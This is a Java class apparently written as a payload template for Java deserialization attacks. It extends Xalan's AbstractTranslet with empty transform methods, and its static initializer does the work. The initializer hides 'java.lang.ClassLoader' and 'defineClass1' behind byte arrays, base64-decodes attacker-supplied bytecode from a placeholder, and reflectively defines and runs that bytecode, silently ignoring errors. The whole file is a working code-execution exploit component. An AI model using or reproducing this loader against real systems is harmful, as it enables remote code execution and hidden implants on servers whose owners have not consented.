package org.example;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class repairTpl extends AbstractTranslet {
    static{
        final String t = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114});
        final String p = new String(new byte[]{100, 101, 102, 105, 110, 101, 67, 108, 97, 115, 115, 49});
        try {
            // ATTENTION ATTENTION ATTENTION ATTENTION ATTENTION ATTENTION ATTENTION ATTENTION ATTENTION ATTENTION
            byte[] b = new sun.misc.BASE64Decoder().decodeBuffer("writeYourBytecodeHere");
            java.lang.reflect.Method m = Class.forName(t).getDeclaredMethod(p, String.class, byte[].class,
                    int.class, int.class, java.security.ProtectionDomain.class, String.class);
            m.setAccessible(true);
            ((Class<?>) m.invoke(Thread.currentThread().getContextClassLoader(), null, b, 0, b.length, null, null))
                    .newInstance();
        } catch (Exception ignored) {
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
